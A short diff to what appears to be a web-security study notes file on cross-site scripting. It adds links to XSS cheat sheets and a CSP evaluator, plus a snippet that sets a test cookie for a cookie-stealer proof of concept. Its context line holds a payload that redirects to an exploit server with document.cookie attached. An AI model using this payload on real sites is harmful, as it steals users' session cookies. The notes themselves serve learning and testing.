@@ -144,7 +144,11 @@ document.location='https://exploit.exploit-server.net/cookies?c='+document.cooki
 + [Cross-site scripting (XSS) cheat sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)
 + [PayloadsAllTheThings (XSS)](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection#xss-in-htmlapplications)  
 
->Set test unsecure cookie in browser dev tools to do POC XSS cookie stealer.  
+>CSP Evaluator tool to check if content security policy is in place to mitigate XSS attacks.
+
++ [CSP Evaluator](https://csp-evaluator.withgoogle.com/)  
+  
+>Set a test unsecure cookie in browser dev tools to do POC XSS cookie stealer.  
 
 ```JavaScript
 document.cookie = "TopSecret=UnSafeCookieSessionValueForTopSecretCookie";
